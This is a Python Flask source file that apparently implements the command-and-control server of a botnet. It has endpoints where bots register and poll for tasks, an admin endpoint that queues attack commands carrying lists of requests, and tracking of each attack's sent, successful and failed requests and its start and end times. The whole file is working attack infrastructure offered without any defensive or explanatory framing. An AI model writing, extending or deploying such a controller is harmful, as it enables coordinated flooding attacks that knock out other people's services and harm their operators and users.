from flask import Flask, request, jsonify
import datetime
import uuid

app = Flask(__name__)

botnet_state = {
    "active_bots": [],
    "task_queue": [],
    "logs": [],
    "attacks": {}
}

@app.route('/register', methods=['POST'])
def register_bot():
    bot_id = request.json.get('bot_id')
    if bot_id not in botnet_state["active_bots"]:
        botnet_state["active_bots"].append(bot_id)
    return jsonify({"status": "registered"})

@app.route('/get_task/<bot_id>', methods=['GET'])
def get_task(bot_id):
    if botnet_state["task_queue"]:
        return jsonify({"task": botnet_state["task_queue"].pop(0)})
    return jsonify({"task": "IDLE"})

@app.route('/admin/send_command', methods=['POST'])
def send_command():
    command_data = request.json
    attack_id = str(uuid.uuid4())
    command_data["attack_id"] = attack_id

    botnet_state["attacks"][attack_id] = {
        "status": "running",
        "requests_sent": 0,
        "requests_failed": 0,
        "requests_successful": 0,
        "num_requests": len(command_data.get("requests", [])),
        "start_time": datetime.datetime.now().strftime("%H:%M:%S")
    }

    botnet_state["task_queue"].append(command_data)
    return jsonify({"status": "command_queued", "attack_id": attack_id, "queue_size": len(botnet_state["task_queue"])})

@app.route('/report_log', methods=['POST'])
def report_log():
    log_entry = request.json
    log_entry['timestamp'] = datetime.datetime.now().strftime("%H:%M:%S")
    botnet_state["logs"].append(log_entry)
    if len(botnet_state["logs"]) > 50:
        botnet_state["logs"].pop(0)
    return jsonify({"status": "logged"})

@app.route('/admin/get_logs', methods=['GET'])
def get_logs():
    return jsonify(botnet_state["logs"])

@app.route('/report_attack_status', methods=['POST'])
def report_attack_status():
    data = request.json
    attack_id = data.get("attack_id")
    if attack_id in botnet_state["attacks"]:
        botnet_state["attacks"][attack_id]["requests_sent"] = data.get("requests_sent", 0)
        botnet_state["attacks"][attack_id]["requests_successful"] = data.get("requests_successful", 0)
        botnet_state["attacks"][attack_id]["requests_failed"] = data.get("requests_failed", 0)
    return jsonify({"status": "updated"})

@app.route('/get_attack_status/<attack_id>', methods=['GET'])
def get_attack_status(attack_id):
    if attack_id in botnet_state["attacks"]:
        return jsonify(botnet_state["attacks"][attack_id])
    return jsonify({"status": "not_found"}), 404

@app.route('/finish_attack', methods=['POST'])
def finish_attack():
    data = request.json
    attack_id = data.get("attack_id")
    if attack_id in botnet_state["attacks"]:
        botnet_state["attacks"][attack_id]["status"] = "completed"
        botnet_state["attacks"][attack_id]["end_time"] = datetime.datetime.now().strftime("%H:%M:%S")
    return jsonify({"status": "attack_finished"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)